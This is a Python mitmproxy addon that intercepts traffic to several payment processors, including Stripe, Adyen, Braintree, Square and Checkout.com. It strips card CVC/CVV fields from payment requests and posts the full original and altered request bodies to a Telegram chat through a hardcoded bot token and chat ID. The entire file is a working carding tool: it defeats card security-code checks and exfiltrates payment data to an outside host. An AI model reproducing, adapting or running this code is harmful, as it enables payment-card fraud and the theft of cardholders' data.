import re
import requests
from mitmproxy import http, ctx

# Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = '7195510626:AAEESkdWYtD8sG-qKgHW6Sod0AsdS3E4zmY'
TELEGRAM_CHAT_ID = '-1002020685168'

# Domains to intercept for modifying requests and corresponding keys
DOMAIN_KEYS_MAPPING = {
    "api.stripe.com": [
        rb"payment_method_data\[card\]\[cvc\]=[\d]{3,4}",
        rb"card\[cvc\]=[\d]{3,4}",
        rb"source_data\[card\]\[cvc\]=[\d]{3,4}"
    ],
    "cloud.boosteroid.com": [
        rb"encryptedSecurityCode\":\s*\"[^\"]+\""
    ],
    "api.checkout.com": [
        rb"\"cvv\":\s*\"[\d]{3,4}\""
    ],
    "pci-connect.squareup.com": [
        rb"cvv\":\s*\"[\d]{3,4}\""
    ],
    "checkoutshopper-live.adyen.com": [
        rb"encryptedSecurityCode\":\s*\"[^\"]+\""
    ],
    "payments.vultr.com": [
        rb"cc_cscv=[\d]{3,4}"
    ],
    "payments.braintree-api.com": [
        rb"\"cvv\":\s*\"[\d]{3,4}\""
    ]
}

def send_telegram_message(message):
    """
    Sends a message to the specified Telegram chat.
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    response = requests.post(url, data=payload)
    return response

def clean_up_trailing_characters(request_body, domain):
    """
    Cleans up trailing commas and quotes left behind after removing CVC values.
    """
    if domain == "cloud.boosteroid.com" or domain == "checkoutshopper-live.adyen.com":
        request_body = re.sub(rb",\s*\"encryptedSecurityCode\":\s*\"\"", b"", request_body)
    return request_body

def remove_cvc_from_request_body(request_body, keys_to_remove):
    """
    Removes the CVC value from the request body based on the specified keys.
    """
    for key in keys_to_remove:
        request_body = re.sub(key, b"", request_body)
    return request_body

def format_message(domain, original_body, modified_body):
    """
    Formats the message to be sent to Telegram.
    """
    message = (
        f"*Domain:* {domain}\n"
        f"*Original Request Body:*\n```\n{original_body}\n```\n"
        f"*Modified Request Body:*\n```\n{modified_body}\n```"
    )
    return message

def format_error_message(domain, error_message):
    """
    Formats the error message to be sent to Telegram.
    """
    message = (
        f"*Domain:* {domain}\n"
        f"*Error Message:*\n```\n{error_message}\n```"
    )
    return message

def request(flow: http.HTTPFlow):
    """
    This function intercepts and modifies requests to remove CVV data.
    """
    try:
        for domain, keys in DOMAIN_KEYS_MAPPING.items():
            if domain in flow.request.pretty_host:
                if keys:
                    # Get original request body for logging
                    original_request_body = flow.request.content.decode('utf-8', errors='ignore')
                    ctx.log.info(f"Original Request Body for {domain}: {original_request_body}")

                    # Remove CVV codes from the payment data
                    modified_body = remove_cvc_from_request_body(flow.request.content, keys)
                    
                    # Clean up any trailing characters if necessary
                    modified_body = clean_up_trailing_characters(modified_body, domain)

                    # Get modified request body for logging
                    modified_request_body = modified_body.decode('utf-8', errors='ignore')
                    ctx.log.info(f"Modified Request Body for {domain}: {modified_request_body}")

                    # Format and send log message to Telegram
                    message = format_message(domain, original_request_body, modified_request_body)
                    send_telegram_message(message)

                    # Set the modified body back to the request
                    flow.request.content = modified_body
                else:
                    ctx.log.info(f"Skipping request interception for domain: {domain}")
    except Exception as e:
        error_message = str(e)
        ctx.log.error(f"Error processing request for {domain}: {error_message}")
        formatted_error_message = format_error_message(domain, error_message)
        send_telegram_message(formatted_error_message)

def start():
    """
    Function executed when the proxy starts.
    """
    ctx.log.info("Proxy server started. Ready to intercept requests.")
    send_telegram_message("Proxy server started. Ready to intercept requests.")

# Attach handlers to mitmproxy
addons = [
    request
]
